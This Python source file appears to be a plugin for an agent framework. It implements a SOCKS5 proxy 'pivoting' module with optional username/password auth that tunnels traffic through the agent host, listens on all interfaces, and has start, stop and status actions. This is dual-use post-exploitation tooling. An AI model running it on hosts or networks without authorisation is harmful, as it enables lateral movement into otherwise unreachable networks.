"""
SOCKS5 proxy pivot module for Project Lucy agent.
Runs a minimal SOCKS5 server (RFC 1928) with optional username/password
auth (RFC 1929) that tunnels traffic through the agent host.
Actions: start, stop, status.
"""
import select
import socket
import struct
import threading

name = "pivoting"
version = "1.0.0"
os_compat = ["Windows", "Linux", "Darwin"]
dependencies: list[str] = []

_server_thread: threading.Thread | None = None
_server_stop = threading.Event()
_server_sock: socket.socket | None = None
_listen_port: int = 1080
_auth_user: str = ""
_auth_pass: str = ""
_lock = threading.Lock()


def _relay(a: socket.socket, b: socket.socket) -> None:
    """Bidirectionally relay data between two sockets until one closes."""
    socks = [a, b]
    try:
        while True:
            r, _, _ = select.select(socks, [], socks, 60)
            if not r:
                break
            for s in r:
                try:
                    data = s.recv(65535)
                except Exception:
                    return
                if not data:
                    return
                other = b if s is a else a
                try:
                    other.sendall(data)
                except Exception:
                    return
    finally:
        for s in socks:
            try:
                s.close()
            except Exception:
                pass


def _handle_client(client: socket.socket, addr) -> None:
    """Handle a single SOCKS5 client connection."""
    try:
        # --- Greeting -------------------------------------------------------
        header = client.recv(2)
        if len(header) < 2 or header[0] != 0x05:
            client.close()
            return
        nmethods = header[1]
        methods = client.recv(nmethods)
        if len(methods) < nmethods:
            client.close()
            return

        if _auth_user:
            # Require username/password auth (0x02)
            if 0x02 not in methods:
                client.sendall(b"\x05\xff")
                client.close()
                return
            client.sendall(b"\x05\x02")
            # Read auth sub-negotiation (RFC 1929)
            ver = client.recv(1)
            if not ver or ver[0] != 0x01:
                client.close()
                return
            ulen = client.recv(1)
            if not ulen:
                client.close()
                return
            username = client.recv(ulen[0])
            plen = client.recv(1)
            if not plen:
                client.close()
                return
            password = client.recv(plen[0])
            if username.decode(errors="replace") != _auth_user or password.decode(errors="replace") != _auth_pass:
                client.sendall(b"\x01\x01")
                client.close()
                return
            client.sendall(b"\x01\x00")
        else:
            # No auth (0x00)
            if 0x00 not in methods:
                client.sendall(b"\x05\xff")
                client.close()
                return
            client.sendall(b"\x05\x00")

        # --- Request --------------------------------------------------------
        req = client.recv(4)
        if len(req) < 4 or req[0] != 0x05:
            client.close()
            return
        cmd, _, atyp = req[1], req[2], req[3]

        if cmd != 0x01:  # only CONNECT
            client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            client.close()
            return

        # Parse destination
        if atyp == 0x01:  # IPv4
            addr_bytes = client.recv(4)
            if len(addr_bytes) < 4:
                client.close()
                return
            dst_host = socket.inet_ntoa(addr_bytes)
        elif atyp == 0x03:  # domain
            dlen = client.recv(1)
            if not dlen:
                client.close()
                return
            dst_host = client.recv(dlen[0]).decode(errors="replace")
        elif atyp == 0x04:  # IPv6
            addr_bytes = client.recv(16)
            if len(addr_bytes) < 16:
                client.close()
                return
            dst_host = socket.inet_ntop(socket.AF_INET6, addr_bytes)
        else:
            client.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            client.close()
            return

        port_bytes = client.recv(2)
        if len(port_bytes) < 2:
            client.close()
            return
        dst_port = struct.unpack("!H", port_bytes)[0]

        # Connect to target
        try:
            remote = socket.create_connection((dst_host, dst_port), timeout=10)
        except Exception:
            client.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            client.close()
            return

        # Success reply (bound address = 0.0.0.0:0)
        client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")

        # Relay
        _relay(client, remote)

    except Exception:
        try:
            client.close()
        except Exception:
            pass


def _serve(port: int) -> None:
    """Main server loop."""
    global _server_sock
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(64)
    srv.settimeout(1.0)
    _server_sock = srv

    while not _server_stop.is_set():
        try:
            client, addr = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        t = threading.Thread(target=_handle_client, args=(client, addr), daemon=True)
        t.start()

    try:
        srv.close()
    except Exception:
        pass


def run(action: str = "status", **params) -> dict:
    global _server_thread, _server_stop, _listen_port, _auth_user, _auth_pass

    if action == "start":
        with _lock:
            if _server_thread and _server_thread.is_alive():
                return {
                    "status": "completed",
                    "data": {"running": True, "port": _listen_port, "message": "already running"},
                }

            listen_port = int(params.get("listen_port", 1080))
            username = params.get("username", "")
            password = params.get("password", "")

            _server_stop = threading.Event()
            _server_stop.clear()
            _listen_port = listen_port
            _auth_user = username
            _auth_pass = password

            try:
                _server_thread = threading.Thread(
                    target=_serve, args=(listen_port,), daemon=True
                )
                _server_thread.start()
                # Brief wait to catch immediate bind errors
                _server_stop.wait(0.3)
                if not _server_thread.is_alive():
                    return {"status": "failed", "error": "Server thread exited unexpectedly"}
            except Exception as exc:
                return {"status": "failed", "error": str(exc)}

            return {
                "status": "completed",
                "data": {
                    "running": True,
                    "port": listen_port,
                    "auth": bool(username),
                },
            }

    elif action == "stop":
        with _lock:
            _server_stop.set()
            if _server_sock:
                try:
                    _server_sock.close()
                except Exception:
                    pass
            if _server_thread:
                _server_thread.join(timeout=3)
                _server_thread = None
            _server_sock = None
            _auth_user = ""
            _auth_pass = ""
        return {"status": "completed", "data": {"running": False}}

    elif action == "status":
        running = _server_thread is not None and _server_thread.is_alive()
        return {
            "status": "completed",
            "data": {"running": running, "port": _listen_port if running else None},
        }

    return {"status": "failed", "error": f"Unknown action: {action}"}
